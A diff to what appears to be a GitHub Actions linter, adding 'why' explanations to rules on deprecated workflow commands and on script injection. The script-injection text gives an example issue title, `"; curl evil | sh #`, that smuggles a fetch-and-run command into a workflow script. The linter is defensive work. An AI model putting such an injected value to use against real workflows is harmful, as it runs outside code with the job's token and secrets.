@@ -97,9 +97,15 @@ rule! {
         id: "deprecated-commands",
         category: Correctness,
         default: Error,
-        description: "A script uses a workflow command that GitHub has disabled (`::set-output`, \
-                  `::save-state`, `::set-env`, `::add-path`); write to `$GITHUB_OUTPUT`, \
-                  `$GITHUB_STATE`, `$GITHUB_ENV` or `$GITHUB_PATH` instead.",
+        description: "Reports a script that uses a workflow command that GitHub has disabled: \
+                  `::set-output`, `::save-state`, `::set-env` or `::add-path`.",
+        why: "GitHub disabled `set-env` and `add-path` because any tool that prints a line to the \
+                  log could set an environment variable or change the `PATH` of the job, and moved \
+                  `set-output` and `save-state` to files too. A step that still prints the command \
+                  does not set the value, so a later step reads an empty one.\n\
+                  To fix, append to the file the runner provides: `echo \"name=value\" >> \
+                  \"$GITHUB_OUTPUT\"`, and `$GITHUB_STATE`, `$GITHUB_ENV` or `$GITHUB_PATH` for the \
+                  others.",
         example: "steps:\n  - run: echo \"::set-output name=v::1\"   # reported",
     }
 
@@ -182,10 +188,14 @@ rule! {
         id: "script-injection",
         category: Correctness,
         default: Warn,
-        description: "An expression in a `run` script reads text that an attacker can choose (an \
-                  issue or pull request title, a branch name, a commit message): it is pasted \
-                  into the script before the shell runs, so it can inject commands. Pass it \
-                  through an environment variable (`env:`) and read `\"$VAR\"` instead.",
+        description: "Reports an expression in a `run` script that reads text that an attacker can choose, \
+                  such as the title or body of an issue or pull request, a branch name or a commit \
+                  message.",
+        why: "The runner replaces the `${{ }}` expression with its value before the shell sees the \
+                  script. A title like `\"; curl evil | sh #` becomes part of the script and runs with \
+                  the job's token and secrets.\n\
+                  To fix, pass the value through an environment variable (`env:`) and read `\"$VAR\"` in \
+                  the script.",
         example: "steps:\n  - run: echo \"${{ github.event.issue.title }}\"   # reported",
     }
 
